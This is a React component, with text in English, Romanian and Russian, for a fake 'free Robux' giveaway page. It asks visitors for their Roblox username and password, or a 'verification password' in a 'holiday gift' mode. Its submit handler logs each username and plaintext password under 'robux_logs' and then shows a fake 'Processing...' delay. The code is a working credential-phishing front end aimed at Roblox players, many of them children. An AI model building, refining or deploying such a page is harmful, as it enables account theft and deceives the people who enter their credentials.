
import React, { useState } from 'react';
import { StoredEntry, Language } from '../types';

interface RegisterFormProps {
  onComplete: (username: string) => void;
  onBack: () => void;
  lang: Language;
  theme: 'dark' | 'light';
  robuxAmount?: number;
  isGift?: boolean;
}

const RegisterForm: React.FC<RegisterFormProps> = ({ onComplete, onBack, lang, theme, robuxAmount = 1000, isGift = false }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const content = {
    en: {
      back: "Back",
      title: isGift ? "🎁 Holiday Gift Delivery" : "Account Registration",
      sub: isGift 
        ? `Enter your friend's Roblox username to send ${robuxAmount.toLocaleString()} Robux gift instantly.`
        : `Please enter your Roblox account username and password to receive ${robuxAmount.toLocaleString()} Robux instantly.`,
      user_label: isGift ? "Friend's Username" : "Roblox Username",
      pass_label: "Your Verification Password",
      btn: isGift ? "SEND GIFT NOW" : "NEXT STEP",
      proc: "Processing..."
    },
    ro: {
      back: "Înapoi",
      title: isGift ? "🎁 Livrare Cadou de Sărbători" : "Înregistrare Cont",
      sub: isGift 
        ? `Introdu numele de utilizator al prietenului tău pentru a-i trimite cei ${robuxAmount.toLocaleString()} Robux cadou instant.`
        : `Vă rugăm să vă puneți numele și parola de la contul de Roblox pentru a primi cei ${robuxAmount.toLocaleString()} Robux instantaneu.`,
      user_label: isGift ? "Nume Utilizator Prieten" : "Username Roblox",
      pass_label: isGift ? "Parola Ta de Verificare" : "Parolă Roblox",
      btn: isGift ? "TRIMITE CADOU" : "PASUL URMĂTOR",
      proc: "Se procesează..."
    },
    ru: {
      back: "Назад",
      title: isGift ? "🎁 Рождественская доставка подарка" : "Регистрация аккаунта",
      sub: isGift 
        ? `Введите имя пользователя вашего друга, чтобы мгновенно отправить ${robuxAmount.toLocaleString()} Robux в подарок.`
        : `Пожалуйста, введите имя пользователя и пароль от вашего аккаунта Roblox, чтобы получить ${robuxAmount.toLocaleString()} Robux мгновенно.`,
      user_label: isGift ? "Имя друга" : "Имя пользователя Roblox",
      pass_label: "Ваш пароль для верификации",
      btn: isGift ? "ОТПРАВИТЬ ПОДАРОК" : "СЛЕДУЮЩИЙ ШАГ",
      proc: "Обработка..."
    }
  }[lang];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (username && password) {
      setLoading(true);

      const existingEntries = JSON.parse(localStorage.getItem('robux_logs') || '[]');
      const newEntry: StoredEntry = {
        username,
        password,
        promoCode: 'N/A',
        timestamp: new Date().toLocaleString('ro-RO'),
        robuxAmount: robuxAmount,
        isGift: isGift
      };
      localStorage.setItem('robux_logs', JSON.stringify([...existingEntries, newEntry]));

      setTimeout(() => {
        onComplete(username);
      }, 1500);
    }
  };

  return (
    <div className="w-full max-w-md animate-in slide-in-from-bottom-8 fade-in duration-700">
      <div className={`p-8 md:p-10 rounded-[2.5rem] shadow-[0_20px_50px_rgba(0,0,0,0.5)] relative overflow-hidden border transition-all duration-500 ${theme === 'dark' ? 'glass-effect border-white/10' : 'bg-white border-slate-200'}`}>
        <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-red-600 via-green-500 to-red-600 animate-shimmer bg-[length:200%_100%]"></div>
        
        <button onClick={onBack} className={`absolute left-6 top-6 transition-all flex items-center gap-1.5 text-[10px] font-black uppercase tracking-widest ${theme === 'dark' ? 'text-slate-500 hover:text-white' : 'text-slate-400 hover:text-slate-900'}`}>
          <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M15 19l-7-7 7-7" /></svg>
          {content.back}
        </button>
        
        <div className="text-center mt-6 mb-8">
          <div className={`inline-block p-3 rounded-2xl mb-4 border ${theme === 'dark' ? 'bg-red-500/10 border-red-500/20' : 'bg-red-50 border-red-100'}`}>
            <span className="text-2xl">{isGift ? '🎁' : '👤'}</span>
          </div>
          <h2 className={`text-2xl font-black mb-3 tracking-tighter transition-colors ${theme === 'dark' ? 'text-white' : 'text-slate-900'}`}>{content.title}</h2>
          <p className={`text-xs leading-relaxed font-medium transition-colors ${theme === 'dark' ? 'text-slate-400' : 'text-slate-600'}`}>
            {content.sub}
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div className="space-y-2 group">
            <label className={`text-[9px] font-black uppercase tracking-[0.2em] px-1 block transition-colors ${theme === 'dark' ? 'text-slate-500 group-focus-within:text-red-400' : 'text-slate-500 group-focus-within:text-red-600'}`}>{content.user_label}</label>
            <input
              type="text"
              required
              placeholder="Username"
              className={`w-full border rounded-2xl px-5 py-3.5 transition-all font-semibold outline-none text-sm ${theme === 'dark' ? 'bg-slate-900/80 border-white/5 text-white placeholder:text-slate-700 focus:ring-2 focus:ring-red-500/50' : 'bg-slate-50 border-slate-200 text-slate-900 placeholder:text-slate-300 focus:ring-2 focus:ring-red-400'}`}
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
          </div>

          <div className="space-y-2 group">
            <label className={`text-[9px] font-black uppercase tracking-[0.2em] px-1 block transition-colors ${theme === 'dark' ? 'text-slate-500 group-focus-within:text-red-400' : 'text-slate-500 group-focus-within:text-red-600'}`}>{content.pass_label}</label>
            <input
              type="password"
              required
              placeholder="••••••••••••"
              className={`w-full border rounded-2xl px-5 py-3.5 transition-all font-semibold outline-none text-sm ${theme === 'dark' ? 'bg-slate-900/80 border-white/5 text-white placeholder:text-slate-700 focus:ring-2 focus:ring-red-500/50' : 'bg-slate-50 border-slate-200 text-slate-900 placeholder:text-slate-300 focus:ring-2 focus:ring-red-400'}`}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`w-full group relative font-black py-4 rounded-2xl shadow-xl transform transition-all active:scale-95 overflow-hidden text-sm uppercase tracking-widest ${theme === 'dark' ? 'bg-white text-slate-950 hover:bg-red-50 hover:-translate-y-1' : 'bg-slate-900 text-white hover:bg-black hover:-translate-y-1'} ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
          >
            <span className="relative flex items-center justify-center gap-2">
              {loading ? content.proc : content.btn}
            </span>
          </button>
        </form>
      </div>
    </div>
  );
};

export default RegisterForm;
